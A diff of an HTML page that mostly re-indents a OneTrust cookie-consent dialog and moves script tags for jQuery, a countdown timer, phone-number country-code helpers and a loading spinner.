-      </div>
-      <div class="ot-lst-subhdr">
-       <div class="ot-search-cntr">
-        <p class="ot-scrn-rdr" role="status">
-        </p>
-        <label class="ot-scrn-rdr" for="vendor-search-handler">
-        </label>
-        <input aria-label="Interactive Element" id="vendor-search-handler" name="vendor-search-handler" tabindex="0" type="text"/>
-        <svg aria-hidden="true" viewbox="0 -30 110 110" x="0px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" y="0px">
-         <title>
-          Search Icon
-         </title>
-         <path d="M55.146,51.887L41.588,37.786c3.486-4.144,5.396-9.358,5.396-14.786c0-12.682-10.318-23-23-23s-23,10.318-23,23
+        </path>
+       </g>
+      </svg>
+     </button>
+     <h3>
+      Performance Cookies
+     </h3>
+    </div>
+    <div class="ot-lst-subhdr">
+     <div class="ot-search-cntr">
+      <p class="ot-scrn-rdr" role="status">
+      </p>
+      <label class="ot-scrn-rdr" for="vendor-search-handler">
+      </label>
+      <input aria-label="Interactive Element" id="vendor-search-handler" name="vendor-search-handler" tabindex="0" type="text"/>
+      <svg aria-hidden="true" viewbox="0 -30 110 110" x="0px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" y="0px">
+       <title>
+        Search Icon
+       </title>
+       <path d="M55.146,51.887L41.588,37.786c3.486-4.144,5.396-9.358,5.396-14.786c0-12.682-10.318-23-23-23s-23,10.318-23,23
             s10.318,23,23,23c4.761,0,9.298-1.436,13.177-4.162l13.661,14.208c0.571,0.593,1.339,0.92,2.162,0.92
             c0.779,0,1.518-0.297,2.079-0.837C56.255,54.982,56.293,53.08,55.146,51.887z M23.984,6c9.374,0,17,7.626,17,17s-7.626,17-17,17
             s-17-7.626-17-17S14.61,6,23.984,6z" fill="#2e3644">
-         </path>
-        </svg>
-       </div>
-       <div class="ot-fltr-cntr">
-        <button aria-haspopup="true" aria-label="Filter" id="filter-btn-handler" tabindex="0">
-         <svg aria-hidden="true" role="presentation" viewbox="0 0 402.577 402.577" x="0px" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" y="0px">
-          <title>
-           Filter Icon
-          </title>
-          <g>
-           <path d="M400.858,11.427c-3.241-7.421-8.85-11.132-16.854-11.136H18.564c-7.993,0-13.61,3.715-16.846,11.136
+       </path>
+      </svg>
+     </div>
+     <div class="ot-fltr-cntr">
+      <button aria-haspopup="true" aria-label="Filter" id="filter-btn-handler" tabindex="0">
+       <svg aria-hidden="true" role="presentation" viewbox="0 0 402.577 402.577" x="0px" xml:space="preserve" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" y="0px">
+        <title>
+         Filter Icon
+        </title>
+        <g>
+         <path d="M400.858,11.427c-3.241-7.421-8.85-11.132-16.854-11.136H18.564c-7.993,0-13.61,3.715-16.846,11.136
       c-3.234,7.801-1.903,14.467,3.999,19.985l140.757,140.753v138.755c0,4.955,1.809,9.232,5.424,12.854l73.085,73.083
       c3.429,3.614,7.71,5.428,12.851,5.428c2.282,0,4.66-0.479,7.135-1.43c7.426-3.238,11.14-8.851,11.14-16.845V172.166L396.861,31.413
       C402.765,25.895,404.093,19.231,400.858,11.427z" fill="#fff">
-           </path>
-          </g>
-         </svg>
-        </button>
-       </div>
-       <div id="ot-anchor">
-       </div>
-       <section id="ot-fltr-modal">
-        <div id="ot-fltr-cnt">
-         <button aria-label="Interactive Element" id="clear-filters-handler" tabindex="0">
-          Clear
-         </button>
-         <div class="ot-fltr-scrlcnt ot-pc-scrollbar">
-          <div class="ot-fltr-opts">
-           <div class="ot-fltr-opt">
-            <div class="ot-chkbox">
-             <input aria-checked="false" aria-label="Interactive Element" class="category-filter-handler" id="chkbox-id" tabindex="0" type="checkbox"/>
-             <label for="chkbox-id">
-              <span class="ot-label-txt">
-               checkbox
-                                                        label
-              </span>
-             </label>
-             <span class="ot-label-status">
-              label
-             </span>
-            </div>
-           </div>
-          </div>
-          <div class="ot-fltr-btns">
-           <button aria-label="Interactive Element" id="filter-apply-handler" tabindex="0">
-            Apply
-           </button>
-           <button aria-label="Interactive Element" id="filter-cancel-handler" tabindex="0">
-            Cancel
-           </button>
-          </div>
-         </div>
-        </div>
-       </section>
-      </div>
+         </path>
+        </g>
+       </svg>
+      </button>
      </div>
-     <section class="ot-host-cnt ot-pc-scrollbar" id="ot-lst-cnt">
-      <div id="ot-sel-blk">
-       <div class="ot-sel-all">
-        <div class="ot-sel-all-hdr">
-         <span class="ot-consent-hdr">
-          Consent
-         </span>
-         <span class="ot-li-hdr">
-          Leg.Interest
-         </span>
-        </div>
-        <div class="ot-sel-all-chkbox">
-         <div class="ot-chkbox" id="ot-selall-hostcntr">
-          <input aria-checked="false" aria-label="Interactive Element" id="select-all-hosts-groups-handler" tabindex="0" type="checkbox"/>
-          <label for="select-all-hosts-groups-handler">
-           <span class="ot-label-txt">
-            checkbox
-                                            label
-           </span>
-          </label>
-          <span class="ot-label-status">
-           label
-          </span>
-         </div>
-         <div class="ot-chkbox" id="ot-selall-vencntr">
-          <input aria-checked="false" aria-label="Interactive Element" id="select-all-vendor-groups-handler" tabindex="0" type="checkbox"/>
-          <label for="select-all-vendor-groups-handler">
-           <span class="ot-label-txt">
-            checkbox
-                                            label
-           </span>
-          </label>
-          <span class="ot-label-status">
-           label
-          </span>
-         </div>
-         <div class="ot-chkbox" id="ot-selall-licntr">
-          <input aria-checked="false" aria-label="Interactive Element" id="select-all-vendor-leg-handler" tabindex="0" type="checkbox"/>
-          <label for="select-all-vendor-leg-handler">
-           <span class="ot-label-txt">
-            checkbox
-                                            label
-           </span>
-          </label>
-          <span class="ot-label-status">
-           label
-          </span>
-         </div>
-        </div>
-       </div>
-      </div>
-      <div class="ot-sdk-row">
-       <div class="ot-sdk-column">
-        <ul id="ot-host-lst">
-         <li class="ot-host-item">
-          <button aria-expanded="false" aria-label="Interactive Element" class="ot-host-box" tabindex="0">
-          </button>
-          <section class="ot-acc-hdr">
-           <div class="ot-host-hdr">
-            <h3 class="ot-host-name">
-            </h3>
-            <h4 class="ot-host-desc">
-            </h4>
-            <span class="ot-host-expand">
-             View
-                                                Cookies
+     <div id="ot-anchor">
+     </div>
+     <section id="ot-fltr-modal">
+      <div id="ot-fltr-cnt">
+       <button aria-label="Interactive Element" id="clear-filters-handler" tabindex="0">
+        Clear
+       </button>
+       <div class="ot-fltr-scrlcnt ot-pc-scrollbar">
+        <div class="ot-fltr-opts">
+         <div class="ot-fltr-opt">
+          <div class="ot-chkbox">
+           <input aria-checked="false" aria-label="Interactive Element" class="category-filter-handler" id="chkbox-id" tabindex="0" type="checkbox"/>
+           <label for="chkbox-id">
+            <span class="ot-label-txt">
+             checkbox
+                                                        label
             </span>
-           </div>
-           <div class="ot-tgl-cntr">
-           </div>
-          </section>
-          <div class="ot-acc-txt">
-           <div class="ot-host-opts">
-            <ul class="ot-host-opt">
-             <li class="ot-host-info">
-              <div>
-               <div>
-                Name
-               </div>
-               <div>
-                cookie name
-               </div>
-              </div>
-             </li>
-            </ul>
-           </div>
+           </label>
+           <span class="ot-label-status">
+            label
+           </span>
           </div>
-         </li>
-        </ul>
+         </div>
+        </div>
+        <div class="ot-fltr-btns">
+         <button aria-label="Interactive Element" id="filter-apply-handler" tabindex="0">
+          Apply
+         </button>
+         <button aria-label="Interactive Element" id="filter-cancel-handler" tabindex="0">
+          Cancel
+         </button>
+        </div>
        </div>
       </div>
      </section>
-    </section>
-    <div class="ot-pc-footer">
-     <div class="ot-btn-container">
-      <button aria-label="Interactive Element" class="save-preference-btn-handler onetrust-close-btn-handler" tabindex="0">
-       Confirm My Choices
-      </button>
-     </div>
-     <div class="ot-pc-footer-logo">
-      <a aria-label="Powered by OneTrust Opens in a new Tab" href="#about" rel="noopener noreferrer" tabindex="0" target="_blank">
-       <img alt="Powered by Onetrust" loading="lazy" src="images/poweredBy_ot_logo.svg" title="Powered by OneTrust Opens in a new Tab"/>
-      </a>
+    </div>
+   </div>
+   <section class="ot-host-cnt ot-pc-scrollbar" id="ot-lst-cnt">
+    <div id="ot-sel-blk">
+     <div class="ot-sel-all">
+      <div class="ot-sel-all-hdr">
+       <span class="ot-consent-hdr">
+        Consent
+       </span>
+       <span class="ot-li-hdr">
+        Leg.Interest
+       </span>
+      </div>
+      <div class="ot-sel-all-chkbox">
+       <div class="ot-chkbox" id="ot-selall-hostcntr">
+        <input aria-checked="false" aria-label="Interactive Element" id="select-all-hosts-groups-handler" tabindex="0" type="checkbox"/>
+        <label for="select-all-hosts-groups-handler">
+         <span class="ot-label-txt">
+          checkbox
+                                            label
+         </span>
+        </label>
+        <span class="ot-label-status">
+         label
+        </span>
+       </div>
+       <div class="ot-chkbox" id="ot-selall-vencntr">
+        <input aria-checked="false" aria-label="Interactive Element" id="select-all-vendor-groups-handler" tabindex="0" type="checkbox"/>
+        <label for="select-all-vendor-groups-handler">
+         <span class="ot-label-txt">
+          checkbox
+                                            label
+         </span>
+        </label>
+        <span class="ot-label-status">
+         label
+        </span>
+       </div>
+       <div class="ot-chkbox" id="ot-selall-licntr">
+        <input aria-checked="false" aria-label="Interactive Element" id="select-all-vendor-leg-handler" tabindex="0" type="checkbox"/>
+        <label for="select-all-vendor-leg-handler">
+         <span class="ot-label-txt">
+          checkbox
+                                            label
+         </span>
+        </label>
+        <span class="ot-label-status">
+         label
+        </span>
+       </div>
+      </div>
      </div>
     </div>
-    <span aria-atomic="true" aria-live="polite" class="ot-scrn-rdr">
-     Your Privacy
-                [`dialog closed`]
-    </span>
+    <div class="ot-sdk-row">
+     <div class="ot-sdk-column">
+      <ul id="ot-host-lst">
+       <li class="ot-host-item">
+        <button aria-expanded="false" aria-label="Interactive Element" class="ot-host-box" tabindex="0">
+        </button>
+        <section class="ot-acc-hdr">
+         <div class="ot-host-hdr">
+          <h3 class="ot-host-name">
+          </h3>
+          <h4 class="ot-host-desc">
+          </h4>
+          <span class="ot-host-expand">
+           View
+                                                Cookies
+          </span>
+         </div>
+         <div class="ot-tgl-cntr">
+         </div>
+        </section>
+        <div class="ot-acc-txt">
+         <div class="ot-host-opts">
+          <ul class="ot-host-opt">
+           <li class="ot-host-info">
+            <div>
+             <div>
+              Name
+             </div>
+             <div>
+              cookie name
+             </div>
+            </div>
+           </li>
+          </ul>
+         </div>
+        </div>
+       </li>
+      </ul>
+     </div>
+    </div>
+   </section>
+  </section>
+  <div class="ot-pc-footer">
+   <div class="ot-btn-container">
+    <button aria-label="Interactive Element" class="save-preference-btn-handler onetrust-close-btn-handler" tabindex="0">
+     Confirm My Choices
+    </button>
+   </div>
+   <div class="ot-pc-footer-logo">
+    <a aria-label="Powered by OneTrust Opens in a new Tab" href="#about" rel="noopener noreferrer" tabindex="0" target="_blank">
+     <img alt="Powered by Onetrust" loading="lazy" src="images/poweredBy_ot_logo.svg" title="Powered by OneTrust Opens in a new Tab"/>
+    </a>
    </div>
   </div>
-  <script src="js/jquery-3.7.0.js">
-  </script>
-  <script src="js/slick.min.js" type="text/javascript">
-  </script>
-  <script src="js/ion.rangeSlider.min.js">
-  </script>
-  <script src="js/script.js">
-  </script>
-  <script>
-   function updateTimer() {
+  <span aria-atomic="true" aria-live="polite" class="ot-scrn-rdr">
+   Your Privacy
+                [`dialog closed`]
+  </span>
+ </div>
+</div>
+<script src="js/jquery-3.7.0.js">
+</script>
+<script src="js/slick.min.js" type="text/javascript">
+</script>
+<script src="js/ion.rangeSlider.min.js">
+</script>
+<script src="js/script.js">
+</script>
+<script>
+ function updateTimer() {
         const timerElement = document.querySelectorAll('.plusDate');
         const currentTime = new Date().getTime();
 
@@ -2447,11 +2448,11 @@
 
         updateTimer();
         setInterval(updateTimer, 1000);
-  </script>
-  <script src="js/intlphone.js" type="text/javascript">
-  </script>
-  <script type="text/javascript">
-   function intlTelSetGeoCode( code ) {
+</script>
+<script src="js/intlphone.js" type="text/javascript">
+</script>
+<script type="text/javascript">
+ function intlTelSetGeoCode( code ) {
 	var geofields = document.querySelectorAll("input[name=country]");
 	for ( var gid = 0; gid < geofields.length; gid++ ) geofields[gid].value = code;
 }
@@ -2487,35 +2488,33 @@ for ( var atpi = 0; atpi < allthephonefields.length; atpi++ ) {
 }
 if ( initialphonecc ) intlTelSetPhoneCode( initialphonecc );
 if ( initialphonegc ) intlTelSetGeoCode( initialphonegc );
-  </script>
-  <div class="overlay-0w39QFpySi">
-   <div class="lds-spinner-0w39QFpySi">
-    <div>
-    </div>
-    <div>
-    </div>
-    <div>
-    </div>
-    <div>
-    </div>
-    <div>
-    </div>
-    <div>
-    </div>
-    <div>
-    </div>
-    <div>
-    </div>
-    <div>
-    </div>
-    <div>
-    </div>
-    <div>
-    </div>
-    <div>
-    </div>
-   </div>
+</script>
+<div class="overlay-0w39QFpySi">
+ <div class="lds-spinner-0w39QFpySi">
+  <div>
   </div>
-  <link href="css/inline.css" rel="stylesheet" type="text/css"/>
- </body>
-</html>
+  <div>
+  </div>
+  <div>
+  </div>
+  <div>
+  </div>
+  <div>
+  </div>
+  <div>
+  </div>
+  <div>
+  </div>
+  <div>
+  </div>
+  <div>
+  </div>
+  <div>
+  </div>
+  <div>
+  </div>
+  <div>
+  </div>
+ </div>
+</div>
+<link href="css/inline.css" rel="stylesheet" type="text/css"/>
